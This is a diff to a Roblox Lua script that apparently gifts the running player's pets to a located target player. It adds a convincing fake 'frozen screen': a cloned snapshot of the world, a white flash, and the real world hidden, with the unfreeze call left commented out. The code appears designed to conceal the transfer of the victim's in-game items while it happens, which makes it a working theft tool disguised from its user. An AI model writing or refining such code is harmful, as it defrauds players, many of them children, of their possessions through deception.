@@ -95,10 +95,20 @@ local function FreezeScreen()
         end
     end)
     
-    -- Create ScreenGui
+    -- Create ScreenGui with highest display order
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "ScreenFreeze"
+    screenGui.DisplayOrder = 999999999
     screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    
+    -- White flash transition
+    local flashFrame = Instance.new("Frame")
+    flashFrame.Size = UDim2.new(1, 0, 1, 0)
+    flashFrame.Position = UDim2.new(0, 0, 0, 0)
+    flashFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+    flashFrame.BorderSizePixel = 0
+    flashFrame.ZIndex = 10
+    flashFrame.Parent = screenGui
     
     -- Create ViewportFrame for screenshot effect
     local viewportFrame = Instance.new("ViewportFrame")
@@ -106,28 +116,46 @@ local function FreezeScreen()
     viewportFrame.Position = UDim2.new(0, 0, 0, 0)
     viewportFrame.BackgroundTransparency = 1
     viewportFrame.CurrentCamera = workspace.CurrentCamera
+    viewportFrame.ZIndex = 5
     viewportFrame.Parent = screenGui
     
     -- Create WorldModel and clone workspace
     local worldModel = Instance.new("WorldModel")
     worldModel.Parent = viewportFrame
     
-    -- Clone current workspace state
+    -- Clone current workspace state INCLUDING character
     local success, error = pcall(function()
         for _, obj in pairs(workspace:GetChildren()) do
-            if obj ~= LocalPlayer.Character then
-                local cloneSuccess, clone = pcall(function()
-                    return obj:Clone()
-                end)
-                if cloneSuccess and clone then
-                    clone.Parent = worldModel
-                end
+            local cloneSuccess, clone = pcall(function()
+                return obj:Clone()
+            end)
+            if cloneSuccess and clone then
+                clone.Parent = worldModel
             end
         end
     end)
     
+    -- Hide the real world
+    pcall(function()
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj ~= workspace.CurrentCamera and obj.Name ~= "Terrain" then
+                obj.Parent = game:GetService("Lighting")
+            end
+        end
+    end)
+    
+    -- Fade out white flash
+    spawn(function()
+        wait(0.1)
+        for i = 1, 0, -0.1 do
+            flashFrame.BackgroundTransparency = 1 - i
+            wait(0.02)
+        end
+        flashFrame:Destroy()
+    end)
+    
     if success then
-        Log("🧊 Screen frozen (screenshot)")
+        Log("🧊 Screen frozen (screenshot with character)")
         return true
     else
         Log("❌ Screenshot freeze failed: " .. tostring(error))
@@ -138,18 +166,29 @@ end
 local function UnfreezeScreen()
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
+    local Lighting = game:GetService("Lighting")
     
     local success, error = pcall(function()
+        -- Restore hidden objects from Lighting back to workspace
+        for _, obj in pairs(Lighting:GetChildren()) do
+            if obj.Name ~= "Atmosphere" and obj.Name ~= "Bloom" and obj.Name ~= "Blur" and 
+               obj.Name ~= "ColorCorrection" and obj.Name ~= "DepthOfField" and obj.Name ~= "SunRays" and
+               obj.Name ~= "Sky" and obj.Name ~= "Clouds" then
+                obj.Parent = workspace
+            end
+        end
+        
+        -- Remove freeze screen
         local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
         if screenGui then
             screenGui:Destroy()
-            return true
         end
-        return false
+        
+        return true
     end)
     
     if success then
-        Log("🔓 Screen unfrozen")
+        Log("🔓 Screen unfrozen - world restored")
         return true
     else
         Log("❌ Unfreeze failed: " .. tostring(error))
@@ -850,7 +889,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    --UnfreezeScreen()
+    -- UnfreezeScreen()
     isRunning = false
 end
 
@@ -868,9 +907,9 @@ local function Main()
         if not isRunning then
             local target = FindTargetPlayer()
             if target then
-
-                FreezeScreen()
                 
+                FreezeScreen()
+                wait(2) -- Give them time to load
                 Log("🎯 Found target: " .. target.Name)
                 
                 -- Teleport to target
